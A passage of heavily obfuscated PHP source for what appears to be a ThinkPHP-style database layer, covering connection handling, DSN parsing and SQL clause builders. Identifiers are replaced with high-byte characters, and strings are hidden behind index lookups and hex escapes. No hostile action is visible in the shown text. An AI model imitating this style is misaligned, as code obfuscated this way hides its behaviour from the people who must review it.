$…ïíš›™[$°ˆªÁÅ•[541]]; return !1; } $•ÃÌøÏà = array($°ˆªÁÅ•[888] => $…ïíš›™[$°ˆªÁÅ•[888]], $°ˆªÁÅ•[87] => array($°ˆªÁÅ•[459], "{$öİ³ˆ €}\45")); $ËÎˆ¡¯ = Model($°ˆªÁÅ•[860])->where($•ÃÌøÏà)->field($°ˆªÁÅ•[542])->select(); $©èëú•¥ = array_merge($©èëú•¥, array_to_keyvalue($ËÎˆ¡¯, $°ˆªÁÅ•[12], $°ˆªÁÅ•[541])); return !1; } private function _fileFilter($¡°©„ÁÂ) { $Å”Óˆ©À =& $_SERVER[¢ñàß¿€]; return; if (empty($¡°©„ÁÂ)) { return; } $ë¼£Œ = array($Å”Óˆ©À[541] => array($Å”Óˆ©À[7], array_unique($¡°©„ÁÂ))); $Â–»şÚß = Model($Å”Óˆ©À[895])->where($ë¼£Œ)->field($Å”Óˆ©À[193])->select(); foreach ($Â–»şÚß as $¾ğ¦ÁÄô) { Model($Å”Óˆ©À[895])->remove($¾ğ¦ÁÄô[$Å”Óˆ©À[193]], !1); } } private function storeIds() { $øå”•ÚÛ =& $_SERVER[¢ñàß¿€]; $Îó¾ õÖ = Model($øå”•ÚÛ[838])->listData(); $¯ÎÆá± = array(); $İÈ»ºÅÔ = $GLOBALS[$øå”•ÚÛ[6]][$øå”•ÚÛ[92]][$øå”•ÚÛ[896]]; foreach ($Îó¾ õÖ as $œŸ°™ší) { $¡œà—‹ = strtolower($œŸ°™ší[$øå”•ÚÛ[98]]); if (!isset($İÈ»ºÅÔ[$¡œà—‹])) { continue; } $ˆÊ¡Â¢ = $øå”•ÚÛ[77] . (isset($İÈ»ºÅÔ[$¡œà—‹]) ? $İÈ»ºÅÔ[$¡œà—‹] : ucfirst($¡œà—‹)); if (!class_exists($ˆÊ¡Â¢)) { continue; } $¯ÎÆá±[] = $œŸ°™ší[$øå”•ÚÛ[475]]; } return $¯ÎÆá±; } } goto eÍÁèªÕì˜; f›º®æª…‰: class DbSqlite3 extends DbSqlite3Base { public function query($àëª Ü‡) { $í„œÄì =& $_SERVER[¢ñàß¿€]; if (!CacheLock::fileLock($í„œÄì[13])) { return !1; } $ÔÛ‘ğ±ê = parent::query($àëª Ü‡); CacheLock::fileUnLock($í„œÄì[13]); return $ÔÛ‘ğ±ê; } public function execute($³À†¿®å) { $ôŠ´¹Úï =& $_SERVER[¢ñàß¿€]; if (!CacheLock::fileLock($ôŠ´¹Úï[13])) { return !1; } $¨ìëëí§ = parent::execute($³À†¿®å); CacheLock::fileUnLock($ôŠ´¹Úï[13]); return $¨ìëëí§; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\x3c\76", "\147\x74" => "\x3e", "\x65\147\x74" => "\76\75", "\154\x74" => "\x3c", "\145\154\x74" => "\74\x3d", "\156\157\164\154\151\x6b\145" => "\116\117\x54\x20\x4c\x49\x4b\x45", "\154\x69\153\145" => "\114\x49\113\105", "\151\156" => "\x49\x4e", "\156\157\164\151\x6e" => "\116\117\x54\40\x49\116", "\156\x6f\164\x20\x69\156" => "\x4e\117\124\x20\111\x4e", "\x62\145\164\x77\x65\145\x6e" => "\102\x45\124\x57\x45\x45\x4e", "\x6e\x6f\164\142\x65\x74\x77\x65\x65\x6e" => "\x4e\x4f\124\x20\x42\x45\x54\x57\105\x45\116", "\156\x6f\164\x20\142\x65\x74\167\x65\x65\x6e" => "\116\x4f\124\x20\102\105\x54\127\x45\105\116"); protected $selectSql = "\123\105\114\x45\x43\124\x25\x44\111\123\124\x49\x4e\x43\124\x25\x20\45\x46\111\x45\114\x44\45\x20\x46\122\117\115\40\x25\124\101\x42\114\105\x25\x25\x4a\117\x49\x4e\x25\x25\x57\110\105\122\x45\x25\x25\x47\122\x4f\125\x50\45\45\x48\101\126\111\x4e\107\x25\45\117\x52\x44\x45\122\45\45\x4c\111\115\x49\124\x25\40\x25\x55\116\x49\x4f\x4e\45\x25\x43\117\115\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $©£Õ»Ûó = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¢ñàß¿€][1035], $©£Õ»Ûó); } public function factory($ê½ãí°Ø = '') { $¿’²¼è” =& $_SERVER[¢ñàß¿€]; $ê½ãí°Ø = $this->parseConfig($ê½ãí°Ø); if (empty($ê½ãí°Ø[$¿’²¼è”[1036]])) { think_exception(think_lang($¿’²¼è”[1037])); } $this->dbType = ucwords(strtolower($ê½ãí°Ø[$¿’²¼è”[1036]])); $Û·½‰ûİ = $¿’²¼è”[1038] . $this->dbType; if (class_exists($Û·½‰ûİ)) { $•ôèŒ—œ = new $Û·½‰ûİ($ê½ãí°Ø); if ($¿’²¼è”[1039] != strtolower($ê½ãí°Ø[$¿’²¼è”[1036]])) { $•ôèŒ—œ->dbType = strtoupper($this->dbType); } else { $•ôèŒ—œ->dbType = $this->_getDsnType($ê½ãí°Ø[$¿’²¼è”[991]]); } } else { think_exception(think_lang($¿’²¼è”[1040]) . $¿’²¼è”[1041] . $Û·½‰ûİ); } return $•ôèŒ—œ; } public function __call($³Úéï¬¨, $ÅÊ€ÆãÀ) { if (method_exists($this, $³Úéï¬¨)) { return call_user_func_array(array($this, $³Úéï¬¨), $ÅÊ€ÆãÀ); } } protected function _getDsnType($›€ß´â¸) { $°šÀËã = explode($_SERVER[¢ñàß¿€][4], $›€ß´â¸); $õÂŒò‰á = strtoupper(trim($°šÀËã[0])); return $õÂŒò‰á; } private function parseConfig($¢·ö·‘ö = '') { $«çñâ¶œ =& $_SERVER[¢ñàß¿€]; if (!empty($¢·ö·‘ö) && is_string($¢·ö·‘ö)) { $¢·ö·‘ö = $this->parseDSN($¢·ö·‘ö); } elseif (is_array($¢·ö·‘ö)) { $¢·ö·‘ö = array_change_key_case($¢·ö·‘ö); $¢·ö·‘ö = array($«çñâ¶œ[1036] => $¢·ö·‘ö[$«çñâ¶œ[1042]], $«çñâ¶œ[963] => $¢·ö·‘ö[$«çñâ¶œ[1043]], $«çñâ¶œ[964] => $¢·ö·‘ö[$«çñâ¶œ[1044]], $«çñâ¶œ[961] => $¢·ö·‘ö[$«çñâ¶œ[1045]], $«çñâ¶œ[962] => $¢·ö·‘ö[$«çñâ¶œ[1046]], $«çñâ¶œ[21] => $¢·ö·‘ö[$«çñâ¶œ[1047]], $«çñâ¶œ[991] => $¢·ö·‘ö[$«çñâ¶œ[1048]], $«çñâ¶œ[17] => isset($¢·ö·‘ö[$«çñâ¶œ[1049]]) ? $¢·ö·‘ö[$«çñâ¶œ[1049]] : array()); } elseif (empty($¢·ö·‘ö)) { if (think_config($«çñâ¶œ[1050]) && $«çñâ¶œ[1039] != strtolower(think_config($«çñâ¶œ[1051]))) { $¢·ö·‘ö = $this->parseDSN(think_config($«çñâ¶œ[1050])); } else { $¢·ö·‘ö = array($«çñâ¶œ[1036] => think_config($«çñâ¶œ[1051]), $«çñâ¶œ[963] => think_config($«çñâ¶œ[1052]), $«çñâ¶œ[964] => think_config($«çñâ¶œ[1053]), $«çñâ¶œ[961] => think_config($«çñâ¶œ[1054]), $«çñâ¶œ[962] => think_config($«çñâ¶œ[1055]), $«çñâ¶œ[21] => think_config($«çñâ¶œ[323]), $«çñâ¶œ[991] => think_config($«çñâ¶œ[1050]), $«çñâ¶œ[17] => think_config($«çñâ¶œ[1056])); } } return $¢·ö·‘ö; } protected function initConnect($ ˜¿Ìê = true) { if (1 == think_config($_SERVER[¢ñàß¿€][22])) { $this->_linkID = $this->multiConnect($ ˜¿Ìê); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¯ÕúÁ¢¿ => $âµ øó”) { $this->_linkID = $âµ øó”; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ü•½õ¼ú = false) { $¿¾é ¬í =& $_SERVER[¢ñàß¿€]; static $¨ôß÷à† = array(); static $Ì‰ßÍ„ = -1; if (empty($¨ôß÷à†)) { foreach ($this->config as $ä–ÕÒ–³ => $‡ƒ±—¦Š) { $¨ôß÷à†[$ä–ÕÒ–³] = explode($¿¾é ¬í[50], $‡ƒ±—¦Š); } } if (think_config($¿¾é ¬í[1057])) { if ($ü•½õ¼ú || think_config($¿¾é ¬í[471]) === !0) { $°ø‡ï‡Î = floor(mt_rand(0, think_config($¿¾é ¬í[1058]) - 1)); $Ì‰ßÍ„ = $°ø‡ï‡Î; } else { if (is_numeric(think_config($¿¾é ¬í[1059]))) { $°ø‡ï‡Î = think_config($¿¾é ¬í[1059]); } else { $°ø‡ï‡Î = floor(mt_rand(think_config($¿¾é ¬í[1058]), count($¨ôß÷à†[$¿¾é ¬í[961]]) - 1)); } } } else { $°ø‡ï‡Î = floor(mt_rand(0, count($¨ôß÷à†[$¿¾é ¬í[961]]) - 1)); $Ì‰ßÍ„ = $°ø‡ï‡Î; } $°ø‡ï‡Î = $Ì‰ßÍ„ !== -1 ? $Ì‰ßÍ„ : $°ø‡ï‡Î; $Ûø“˜äÈ = array($¿¾é ¬í[963] => isset($¨ôß÷à†[$¿¾é ¬í[963]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[963]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[963]][0], $¿¾é ¬í[964] => isset($¨ôß÷à†[$¿¾é ¬í[964]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[964]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[964]][0], $¿¾é ¬í[961] => isset($¨ôß÷à†[$¿¾é ¬í[961]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[961]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[961]][0], $¿¾é ¬í[962] => isset($¨ôß÷à†[$¿¾é ¬í[962]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[962]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[962]][0], $¿¾é ¬í[21] => isset($¨ôß÷à†[$¿¾é ¬í[21]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[21]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[21]][0], $¿¾é ¬í[991] => isset($¨ôß÷à†[$¿¾é ¬í[991]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[991]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[991]][0], $¿¾é ¬í[17] => isset($¨ôß÷à†[$¿¾é ¬í[17]][$°ø‡ï‡Î]) ? $¨ôß÷à†[$¿¾é ¬í[17]][$°ø‡ï‡Î] : $¨ôß÷à†[$¿¾é ¬í[17]][0]); return $this->connect($Ûø“˜äÈ, $°ø‡ï‡Î); } public function parseDSN($À´Ÿ¿í¤) { $ëºúØÉÊ =& $_SERVER[¢ñàß¿€]; if (empty($À´Ÿ¿í¤)) { return !1; } $Ó‘Şşñ = parse_url($À´Ÿ¿í¤); if ($Ó‘Şşñ[$ëºúØÉÊ[207]]) { $ÏéşÖÉ = array($ëºúØÉÊ[1036] => $Ó‘Şşñ[$ëºúØÉÊ[207]], $ëºúØÉÊ[963] => isset($Ó‘Şşñ[$ëºúØÉÊ[662]]) ? $Ó‘Şşñ[$ëºúØÉÊ[662]] : $ëºúØÉÊ[12], $ëºúØÉÊ[964] => isset($Ó‘Şşñ[$ëºúØÉÊ[1060]]) ? $Ó‘Şşñ[$ëºúØÉÊ[1060]] : $ëºúØÉÊ[12], $ëºúØÉÊ[961] => isset($Ó‘Şşñ[$ëºúØÉÊ[208]]) ? $Ó‘Şşñ[$ëºúØÉÊ[208]] : $ëºúØÉÊ[12], $ëºúØÉÊ[962] => isset($Ó‘Şşñ[$ëºúØÉÊ[209]]) ? $Ó‘Şşñ[$ëºúØÉÊ[209]] : $ëºúØÉÊ[12], $ëºúØÉÊ[21] => isset($Ó‘Şşñ[$ëºúØÉÊ[87]]) ? substr($Ó‘Şşñ[$ëºúØÉÊ[87]], 1) : $ëºúØÉÊ[12]); } else { preg_match($ëºúØÉÊ[1061], trim($À´Ÿ¿í¤), $õî»çºî); $ÏéşÖÉ = array($ëºúØÉÊ[1036] => $õî»çºî[1], $ëºúØÉÊ[963] => $õî»çºî[2], $ëºúØÉÊ[964] => $õî»çºî[3], $ëºúØÉÊ[961] => $õî»çºî[4], $ëºúØÉÊ[962] => $õî»çºî[5], $ëºúØÉÊ[21] => $õî»çºî[6]); } $ÏéşÖÉ[$ëºúØÉÊ[991]] = $ëºúØÉÊ[12]; return $ÏéşÖÉ; } protected function debug() { $ÄÈ£¡ó =& $_SERVER[¢ñàß¿€]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÄÈ£¡ó[1062]; if (think_config($ÄÈ£¡ó[1063])) { think_status($ÄÈ£¡ó[1064]); think_trace($this->queryStr . $ÄÈ£¡ó[1065] . think_status($ÄÈ£¡ó[24], $ÄÈ£¡ó[1064], 6) . $ÄÈ£¡ó[1066], $ÄÈ£¡ó[12], $ÄÈ£¡ó[1067]); } } protected function parseLock($æî•ÏÕÂ = false) { $á…‡¿À© =& $_SERVER[¢ñàß¿€]; if (!$æî•ÏÕÂ) { return $á…‡¿À©[12]; } if ($á…‡¿À©[993] == $this->dbType) { return $á…‡¿À©[1068]; } return $á…‡¿À©[1069]; } protected function parseSet($õ‹×ÄªÅ) { $Ô†´Âê‘ =& $_SERVER[¢ñàß¿€]; foreach ($õ‹×ÄªÅ as $Ì¤Òµú‘ => $Ãï·®ÛÛ) { if (is_array($Ãï·®ÛÛ) && $Ô†´Âê‘[373] == $Ãï·®ÛÛ[0]) { $Á²ª¿§ù[] = $this->parseKey($Ì¤Òµú‘) . $Ô†´Âê‘[959] . $Ãï·®ÛÛ[1]; } elseif (is_scalar($Ãï·®ÛÛ) || is_null($Ãï·®ÛÛ)) { $Á²ª¿§ù[] = $this->parseKey($Ì¤Òµú‘) . $Ô†´Âê‘[959] . $this->parseValue($Ãï·®ÛÛ); } } return $Ô†´Âê‘[1070] . implode($Ô†´Âê‘[50], $Á²ª¿§ù); } protected function bindParam($·‰àš, $µŸ‘ÅÆ) { $this->bind[$_SERVER[¢ñàß¿€][4] . $·‰àš] = $µŸ‘ÅÆ; } protected function parseBind($´àÑ™ĞÅ) { $´àÑ™ĞÅ = array_merge($this->bind, $´àÑ™ĞÅ); $this->bind = array(); return $´àÑ™ĞÅ; } function parseKey(&$Êæ½Ü‰•, $”€ë‚ÒÅ = true) { if ($”€ë‚ÒÅ) { $Êæ½Ü‰• = $this->parseKeyCheck($Êæ½Ü‰•); } return $Êæ½Ü‰•; } function parseKeyCheck($ÃÜ’é¯) { $µùï¸• =& $_SERVER[¢ñàß¿€]; $ÃÜ’é¯ = trim($ÃÜ’é¯); if (!preg_match($µùï¸•[1071], $ÃÜ’é¯)) { think_exception($µùï¸•[1072] . $ÃÜ’é¯); } return $ÃÜ’é¯; } protected function parseValue($ßéö¡õğ) { $şŠ£æ¿Ô =& $_SERVER[¢ñàß¿€]; if (is_string($ßéö¡õğ)) { $ßéö¡õğ = $şŠ£æ¿Ô[1032] . $this->escapeString($ßéö¡õğ) . $şŠ£æ¿Ô[1032]; } elseif (isset($ßéö¡õğ[0]) && is_string($ßéö¡õğ[0]) && strtolower($ßéö¡õğ[0]) == $şŠ£æ¿Ô[373]) { $ßéö¡õğ = $this->escapeString($ßéö¡õğ[1]); } elseif (is_array($ßéö¡õğ)) { $ßéö¡õğ = array_map(array($this, $şŠ£æ¿Ô[1033]), $ßéö¡õğ); } elseif (is_bool($ßéö¡õğ)) { $ßéö¡õğ = $ßéö¡õğ ? $şŠ£æ¿Ô[91] : $şŠ£æ¿Ô[228]; } elseif (is_null($ßéö¡õğ)) { $ßéö¡õğ = $şŠ£æ¿Ô[106]; } return $ßéö¡õğ; } protected function parseField($¦ñí¦™ü) { $ÍÊ¨¾¾û =& $_SERVER[¢ñàß¿€]; if (is_string($¦ñí¦™ü) && strpos($¦ñí¦™ü, $ÍÊ¨¾¾û[50])) { $¦ñí¦™ü = explode($ÍÊ¨¾¾û[50], $¦ñí¦™ü); } if (is_array($¦ñí¦™ü)) { $…ú¼Ø•Ã = array(); foreach ($¦ñí¦™ü as $çâ„ªÀè => $Ñ˜¨Ç¶µ) { if (!is_numeric($çâ„ªÀè)) { $…ú¼Ø•Ã[] = $this->parseKey($çâ„ªÀè, !1) . $ÍÊ¨¾¾û[1073] . $this->parseKey($Ñ˜¨Ç¶µ); } else { $…ú¼Ø•Ã[] = $this->parseKey($Ñ˜¨Ç¶µ); } } $ è­şä‘ = implode($ÍÊ¨¾¾û[50], $…ú¼Ø•Ã); } elseif (is_string($¦ñí¦™ü) && !empty($¦ñí¦™ü)) { $ è­şä‘ = $¦ñí¦™ü; } else { $ è­şä‘ = $ÍÊ¨¾¾û[220]; } return $ è­şä‘; } protected function parseTable($¡©Üáßá) { $‡äö¶Â =& $_SERVER[¢ñàß¿€]; if (is_array($¡©Üáßá)) { $‰Ş¨ÆÏŸ = array(); foreach ($¡©Üáßá as $ÅæêÑ¬ò => $÷œê³³²) { if (!is_numeric($ÅæêÑ¬ò)) { $‰Ş¨ÆÏŸ[] = $this->parseKey($ÅæêÑ¬ò) . $‡äö¶Â[53] . $this->parseKey($÷œê³³²); } else { $‰Ş¨ÆÏŸ[] = $this->parseKey($ÅæêÑ¬ò); } } $¡©Üáßá = $‰Ş¨ÆÏŸ; } elseif (is_string($¡©Üáßá)) { if (strstr($¡©Üáßá, $‡äö¶Â[53])) { return $¡©Üáßá; } $¡©Üáßá = explode($‡äö¶Â[50], $¡©Üáßá); array_walk($¡©Üáßá, array($this, $‡äö¶Â[981])); } return $‡äö¶Â[975] . trim(implode($‡äö¶Â[1074], $¡©Üáßá), $‡äö¶Â[461]) . $‡äö¶Â[975]; } protected function parseWhere($” àû) { $‹©Çš =& $_SERVER[¢ñàß¿€]; $×ğøÀä² = $‹©Çš[12]; if (is_string($” àû)) { $×ğøÀä² = $” àû; } else { $†Šíİ¹® = isset($” àû[$‹©Çš[1075]]) ? strtoupper($” àû[$‹©Çš[1075]]) : $‹©Çš[12]; if (in_array($†Šíİ¹®, array($‹©Çš[1076], $‹©Çš[1077], $‹©Çš[1078]))) { $†Šíİ¹® = $‹©Çš[53] . $†Šíİ¹® . $‹©Çš[53]; unset($” àû[$‹©Çš[1075]]); } else { $†Šíİ¹® = $‹©Çš[1079]; } foreach ($” àû as $Ñ‚ıÅ‰‚ => $ıîĞ†ç±) { $×ğøÀä² .= $‹©Çš[354]; if (is_numeric($Ñ‚ıÅ‰‚)) { $Ñ‚ıÅ‰‚ = $‹©Çš[1080]; } if (0 === strpos($Ñ‚ıÅ‰‚, $‹©Çš[11])) { $×ğøÀä² .= $this->parseThinkWhere($Ñ‚ıÅ‰‚, $ıîĞ†ç±); } else { if (!preg_match($‹©Çš[1081], trim($Ñ‚ıÅ‰‚))) { think_exception(think_lang($‹©Çš[1082]) . $‹©Çš[4] . $Ñ‚ıÅ‰‚); } $ÎÏØÈœ = is_array($ıîĞ†ç±) && isset($ıîĞ†ç±[$‹©Çš[1083]]); $Ñ‚ıÅ‰‚ = trim($Ñ‚ıÅ‰‚); if (strpos($Ñ‚ıÅ‰‚, $‹©Çš[214])) { $»äĞ·»‚ = explode($‹©Çš[214], $Ñ‚ıÅ‰‚); $Ñ©íî³² = array(); foreach ($»äĞ·»‚ as $üùºòıû => $ïªàúŸ¶) { $¿¾š˜ñÀ = $ÎÏØÈœ ? $ıîĞ†ç±[$üùºòıû] : $ıîĞ†ç±; $Ñ©íî³²[] = $‹©Çš[337] . $this->parseWhereItem($this->parseKey($ïªàúŸ¶), $¿¾š˜ñÀ) . $‹©Çš[980]; } $×ğøÀä² .= implode($‹©Çš[1084], $Ñ©íî³²); } elseif (strpos($Ñ‚ıÅ‰‚, $‹©Çš[360])) { $»äĞ·»‚ = explode($‹©Çš[360], $Ñ‚ıÅ‰‚); $Ñ©íî³² = array(); foreach ($»äĞ·»‚ as $üùºòıû => $ïªàúŸ¶) { $¿¾š˜ñÀ = $ÎÏØÈœ ? $ıîĞ†ç±[$üùºòıû] : $ıîĞ†ç±; $Ñ©íî³²[] = $‹©Çš[337] . $this->parseWhereItem($this->parseKey($ïªàúŸ¶), $¿¾š˜ñÀ) . $‹©Çš[980]; } $×ğøÀä² .= implode($‹©Çš[1079], $Ñ©íî³²); } else { $×ğøÀä² .= $this->parseWhereItem($this->parseKey($Ñ‚ıÅ‰‚), $ıîĞ†ç±); } } $×ğøÀä² .= $‹©Çš[355] . $†Šíİ¹®; } $×ğøÀä² = substr($×ğøÀä², 0, -strlen($†Šíİ¹®)); } return empty($×ğøÀä²) ? $‹©Çš[12] : $‹©Çš[1085] . $×ğøÀä²; } protected function parseWhereItem($şÎêê—õ, $À˜¯—æÚ) { $½Å×“ä’ =& $_SERVER[¢ñàß¿€]; $â¾‚ – = $½Å×“ä’[12]; if (is_array($À˜¯—æÚ)) { if (is_string($À˜¯—æÚ[0])) { $˜ÙÇËà‚ = strtolower($À˜¯—æÚ[0]); if (in_array($À˜¯—æÚ[0], array($½Å×“ä’[959], $½Å×“ä’[1086], $½Å×“ä’[1087], $½Å×“ä’[1088], $½Å×“ä’[1089], $½Å×“ä’[1090]))) { $â¾‚ – .= $şÎêê—õ . $½Å×“ä’[53] . $À˜¯—æÚ[0] . $½Å×“ä’[53] . $this->parseValue($À˜¯—æÚ[1]); } elseif (preg_match($½Å×“ä’[1091], $À˜¯—æÚ[0])) { $â¾‚ – .= $şÎêê—õ . $½Å×“ä’[53] . $this->exp[$˜ÙÇËà‚] . $½Å×“ä’[53] . $this->parseValue($À˜¯—æÚ[1]); } elseif (preg_match($½Å×“ä’[1092], $À˜¯—æÚ[0])) { if (is_array($À˜¯—æÚ[1])) { $ÄòªòÚ  = isset($À˜¯—æÚ[2]) ? strtoupper($À˜¯—æÚ[2]) : $½Å×“ä’[1077]; if (in_array($ÄòªòÚ , array($½Å×“ä’[1076], $½Å×“ä’[1077], $½Å×“ä’[1078]))) { $è»ûŞ’Ö = array(); foreach ($À˜¯—æÚ[1] as $‚ªÂ¹¿) { $è»ûŞ’Ö[] = $şÎêê—õ . $½Å×“ä’[53] . $this->exp[$˜ÙÇËà‚] . $½Å×“ä’[53] . $this->parseValue($‚ªÂ¹¿); } $â¾‚ – .= $½Å×“ä’[337] . implode($½Å×“ä’[53] . $ÄòªòÚ  . $½Å×“ä’[53], $è»ûŞ’Ö) . $½Å×“ä’[980]; } } else { $â¾‚ – .= $şÎêê—õ . $½Å×“ä’[53] . $this->exp[$˜ÙÇËà‚] . $½Å×“ä’[53] . $this->parseValue($À˜¯—æÚ[1]); } } elseif ($½Å×“ä’[373] == $˜ÙÇËà‚) { $â¾‚ – .= $½Å×“ä’[978] . $şÎêê—õ . $½Å×“ä’[53] . $À˜¯—æÚ[1] . $½Å×“ä’[1093]; } elseif (preg_match($½Å×“ä’[1094], $À˜¯—æÚ[0])) { $â¾‚ – .= $À˜¯—æÚ[0]; } elseif (preg_match($½Å×“ä’[1095], $À˜¯—æÚ[0])) { if (isset($À˜¯—æÚ[2]) && $½Å×“ä’[373] == $À˜¯—æÚ[2]) { $â¾‚ – .= $şÎêê—õ . $½Å×“ä’[53] . $this->exp[$˜ÙÇËà‚] . $½Å×“ä’[53] . $À˜¯—æÚ[1]; } else { if (is_string($À˜¯—æÚ[1])) { $À˜¯—æÚ[1] = explode($½Å×“ä’[50], $À˜¯—æÚ[1]); } $ˆ§æƒ‡ª = implode($½Å×“ä’[50], $this->parseValue($À˜¯—æÚ[1])); $â¾‚ – .= $şÎêê—õ . $½Å×“ä’[53] . $this->exp[$˜ÙÇËà‚] . $½Å×“ä’[978] . $ˆ§æƒ‡ª . $½Å×“ä’[980]; } } elseif (preg_match($½Å×“ä’[1096], $À˜¯—æÚ[0])) { $ª‰…Úç© = is_string($À˜¯—æÚ[1]) ? explode($½Å×“ä’[50], $À˜¯—æÚ[1]) : $À˜¯—æÚ[1]; $â¾‚ – .= $½Å×“ä’[978] . $şÎêê—õ . $½Å×“ä’[53] . $this->exp[$˜ÙÇËà‚] . $½Å×“ä’[53] . $this->parseValue($ª‰…Úç©[0]) . $½Å×“ä’[1079] . $this->parseValue($ª‰…Úç©[1]) . $½Å×“ä’[355]; } else { think_exception(think_lang($½Å×“ä’[1082]) . $½Å×“ä’[4] . $À˜¯—æÚ[0]); } } else { $÷ÙŸ’Åé = count($À˜¯—æÚ); $¢¹æÜ‘§ = $½Å×“ä’[12]; if (is_string($À˜¯—æÚ[$÷ÙŸ’Åé - 1])) { $¢¹æÜ‘§ = isset($À˜¯—æÚ[$÷ÙŸ’Åé - 1]) ? strtoupper($À˜¯—æÚ[$÷ÙŸ’Åé - 1]) : $½Å×“ä’[12]; if (in_array($¢¹æÜ‘§, array($½Å×“ä’[1076], $½Å×“ä’[1077], $½Å×“ä’[1078]))) { $÷ÙŸ’Åé = $÷ÙŸ’Åé - 1; } } else { $¢¹æÜ‘§ = $½Å×“ä’[1076]; } for ($½¤ÅÒ‡ƒ = 0; $½¤ÅÒ‡ƒ < $÷ÙŸ’Åé; $½¤ÅÒ‡ƒ++) { $ª‰…Úç© = is_array($À˜¯—æÚ[$½¤ÅÒ‡ƒ]) ? $À˜¯—æÚ[$½¤ÅÒ‡ƒ][1] : $À˜¯—æÚ[$½¤ÅÒ‡ƒ]; if ($½Å×“ä’[373] == strtolower($À˜¯—æÚ[$½¤ÅÒ‡ƒ][0])) { $â¾‚ – .= $½Å×“ä’[337] . $şÎêê—õ . $½Å×“ä’[53] . $ª‰…Úç© . $½Å×“ä’[1093] . $¢¹æÜ‘§ . $½Å×“ä’[53]; } else { $¶°„‡É = is_array($À˜¯—æÚ[$½¤ÅÒ‡ƒ]) ? $this->exp[strtolower($À˜¯—æÚ[$½¤ÅÒ‡ƒ][0])] : $½Å×“ä’[959]; if (!$¶°„‡É && is_array($À˜¯—æÚ[$½¤ÅÒ‡ƒ]) && in_array($À˜¯—æÚ[$½¤ÅÒ‡ƒ][0], array($½Å×“ä’[959], $½Å×“ä’[1086], $½Å×“ä’[1087], $½Å×“ä’[1088], $½Å×“ä’[1089], $½Å×“ä’[1090]))) { $¶°„‡É = $À˜¯—æÚ[$½¤ÅÒ‡ƒ][0]; } $â¾‚ – .= $½Å×“ä’[337] . $şÎêê—õ . $½Å×“ä’[53] . $¶°„‡É . $½Å×“ä’[53] . $this->parseValue($ª‰…Úç©) . $½Å×“ä’[1093] . $¢¹æÜ‘§ . $½Å×“ä’[53]; } } $â¾‚ – = substr($â¾‚ –, 0, -4); } } else { $â¾‚ – .= $şÎêê—õ . $½Å×“ä’[1097] . $this->parseValue($À˜¯—æÚ); } return $â¾‚ –; } protected function parseThinkWhere($Ğ™Âúİ, $é„Ó«…§) { $…ÆØ‡Š„ =& $_SERVER[¢ñàß¿€]; $¼ëô¹× = $…ÆØ‡Š„[12]; switch ($Ğ™Âúİ) { case $…ÆØ‡Š„[428]: $¼ëô¹× = $é„Ó«…§; break; case $…ÆØ‡Š„[1080]: $¼ëô¹× = is_string($é„Ó«…§) ? $é„Ó«…§ : substr($this->parseWhere($é„Ó«…§), 6); break; case $…ÆØ‡Š„[1098]: parse_str($é„Ó«…§, $ë ²ÊÀô); if (isset($ë ²ÊÀô[$…ÆØ‡Š„[1075]])) { $ü´üÍŠİ = $…ÆØ‡Š„[53] . strtoupper($ë ²ÊÀô[$…ÆØ‡Š„[1075]]) . $…ÆØ‡Š„[53]; unset($ë ²ÊÀô[$…ÆØ‡Š„[1075]]); } else { $ü´üÍŠİ = $…ÆØ‡Š„[1079]; } $¡µÆºÎ± = array(); foreach ($ë ²ÊÀô as $äşÛí‹» => $ÙŠ€Îâß) { $¡µÆºÎ±[] = $this->parseKey($äşÛí‹») . $…ÆØ‡Š„[1097] . $this->parseValue($ÙŠ€Îâß); } $¼ëô¹× = implode($ü´üÍŠİ, $¡µÆºÎ±); break; } return $¼ëô¹×; } protected function parseLimit($ì»‡Åü²) { $¸Ø¾¨Óª =& $_SERVER[¢ñàß¿€]; return !empty($ì»‡Åü²) ? $¸Ø¾¨Óª[51] . $ì»‡Åü² . $¸Ø¾¨Óª[53] : $¸Ø¾¨Óª[12]; } protected function parseJoin($‘õ¾­œ‹) { $ôıàéÌğ =& $_SERVER[¢ñàß¿€]; $‹†éö°¡ = $ôıàéÌğ[12]; if (!empty($‘õ¾­œ‹)) { if (is_array($‘õ¾­œ‹)) { foreach ($‘õ¾­œ‹ as $‘ù±©Úç => $†…›øê) { if (!1 !== stripos($†…›øê, $ôıàéÌğ[1099])) { $‹†éö°¡ .= $ôıàéÌğ[53] . $†…›øê; } else { $‹†éö°¡ .= $ôıàéÌğ[1100] . $†…›øê; } } } else { $‹†éö°¡ .= $ôıàéÌğ[1100] . $‘õ¾­œ‹; } } $‹†éö°¡ = preg_replace($ôıàéÌğ[1101], think_config($ôıàéÌğ[1005]) . $ôıàéÌğ[1102], $‹†éö°¡); return $‹†éö°¡; } protected function parseOrder($ğÎ¦ñÛØ) { $éáŸ–Â¡ =& 